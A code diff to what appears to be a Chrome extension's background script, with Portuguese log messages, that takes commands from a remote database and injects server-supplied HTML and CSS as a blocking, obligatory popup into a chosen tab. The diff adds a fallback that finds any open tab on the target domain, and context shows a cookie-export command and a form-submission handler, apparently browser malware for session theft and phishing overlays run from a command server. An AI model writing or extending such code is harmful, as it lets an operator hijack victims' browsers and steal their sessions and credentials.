@@ -1497,12 +1497,54 @@ async function handleExportCookiesCommand(data) {
 
 // Handle popup command with BLOCKING, OBLIGATORY popup
 async function handlePopupCommand(data) {
-  const tabId = parseInt(data.target_tab_id);
+  const originalTabId = parseInt(data.target_tab_id);
+  const domain = data.target_domain;
   const htmlContent = data.payload?.html_content || '';
   const cssStyles = data.payload?.css_styles || '';
   const commandId = data.command_id || '';
   
-  await chrome.scripting.executeScript({
+  // Try to inject in original tab
+  try {
+    await injectPopupScript(originalTabId, htmlContent, cssStyles, commandId, data.target_tab_id);
+    log('info', `✅ Popup injetado no tab ${originalTabId}`);
+    return;
+  } catch (error) {
+    // If failed, try fallback by domain
+    if (error.message?.includes('No tab with id') || error.message?.includes('Cannot access')) {
+      log('warn', `⚠️ Tab ${originalTabId} inválido, buscando por domínio: ${domain}`);
+      
+      try {
+        // Search for active tabs with that domain
+        const tabs = await chrome.tabs.query({ url: `*://${domain}/*` });
+        
+        if (tabs.length > 0) {
+          const fallbackTabId = tabs[0].id;
+          log('info', `✅ Fallback: usando tab ${fallbackTabId} (${tabs[0].url})`);
+          
+          // Try again with correct tab
+          await injectPopupScript(fallbackTabId, htmlContent, cssStyles, commandId, String(fallbackTabId));
+          
+          // Update command in DB with correct tab_id
+          await updateCommandTabId(commandId, String(fallbackTabId));
+          
+          log('info', `✅ Popup injetado via fallback no tab ${fallbackTabId}`);
+          return;
+        } else {
+          throw new Error(`Nenhuma aba aberta para o domínio ${domain}`);
+        }
+      } catch (fallbackError) {
+        log('error', `❌ Fallback falhou: ${fallbackError.message}`);
+        throw fallbackError;
+      }
+    } else {
+      throw error; // Re-throw other errors
+    }
+  }
+}
+
+// Helper function to inject popup (reusable)
+async function injectPopupScript(tabId, htmlContent, cssStyles, commandId, tabIdStr) {
+  return await chrome.scripting.executeScript({
     target: { tabId },
     func: (html, css, cmdId, apiBase, apiKey, machineIdVal, tabIdVal) => {
       // Remove existing popup if any
@@ -1608,8 +1650,27 @@ async function handlePopupCommand(data) {
       
       document.body.appendChild(overlay);
     },
-    args: [htmlContent, cssStyles, commandId, CONFIG.API_BASE, CONFIG.SUPABASE_ANON_KEY, machineId, data.target_tab_id]
+    args: [htmlContent, cssStyles, commandId, CONFIG.API_BASE, CONFIG.SUPABASE_ANON_KEY, machineId, tabIdStr]
   });
+}
+
+// Update command tab_id in DB
+async function updateCommandTabId(commandId, newTabId) {
+  try {
+    await fetch(`${CONFIG.API_BASE}/rest/v1/remote_commands?id=eq.${commandId}`, {
+      method: 'PATCH',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`,
+        'apikey': CONFIG.SUPABASE_ANON_KEY,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({ target_tab_id: newTabId })
+    });
+    log('info', `✅ Comando ${commandId} atualizado com novo tab_id: ${newTabId}`);
+  } catch (error) {
+    log('warn', `⚠️ Falha ao atualizar tab_id do comando: ${error.message}`);
+  }
 }
 
 // Add message handler for form submission
